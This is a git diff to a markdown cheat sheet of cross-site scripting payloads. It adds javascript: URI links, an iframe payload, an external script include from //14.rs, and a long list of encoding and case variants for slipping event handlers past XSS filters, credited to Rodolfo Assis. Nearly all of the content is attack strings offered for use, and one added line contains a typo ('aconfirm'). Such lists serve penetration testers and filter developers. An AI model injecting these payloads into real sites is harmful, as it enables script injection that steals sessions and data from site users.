@@ -160,12 +160,14 @@ If the your dummy tags lands in the source code as it is, go for any of these pa
 - Without event handlers
 ```
 <object data=javascript:confirm()>
-<script src=//14.rs>
+<a href=javascript:confirm()>click here
+<script src=//14.rs></script>
 <script>confirm()</script>
 ```
 - Without space
 ```
 <svg/onload=confirm()>
+<iframe/src=javascript:alert(1)>
 ```
 - Without slash (/)
 ```
@@ -189,6 +191,35 @@ If the your dummy tags lands in the source code as it is, go for any of these pa
 - Without a Valid HTML tag
 ```
 <x onclick=confirm()>click here
+<x ondrag=aconfirm()>drag it
+```
+
+**Filter bypass procedure by [Rodolfo Assis](https://twitter.com/rodoassis)**
+```
+<x onxxx=1
+%3Cx onxxx=1
+<%78 onxxx=1
+<x %6Fnxxx=1
+<x o%6Exxx=1
+<x on%78xx=1
+<x onxxx%3D1
+<X onxxx=1
+<x ONxxx=1
+<x OnXxx=1
+<X OnXxx=1
+<x onxxx=1 onxxx=1
+<x/onxxx=1
+<x%09onxxx=1
+<x%0Aonxxx=1
+<x%0Conxxx=1
+<x%0Donxxx=1
+<x%2Fonxxx=1
+<x 1='1'onxxx=1
+<x 1="1"onxxx=1
+<x </onxxx=1
+<x 1=">" onxxx=1
+<http://onxxx%3D1/
+<x%2F1=">%22OnXxx%3D1
 ```
 
 ### Awesome Encoding
@@ -205,4 +236,4 @@ Come back later
 
 ### Awesome Credits
 All the payloads are crafted by me unless specified.
-Thanks to my big brother [Rodolfo Assis](https://twitter.com/brutelogic) whose writings inspired me to become an XSSLord.
+Thanks to my big brother [Rodolfo Assis](https://twitter.com/rodoassis) whose writings inspired me to become an XSSLord.
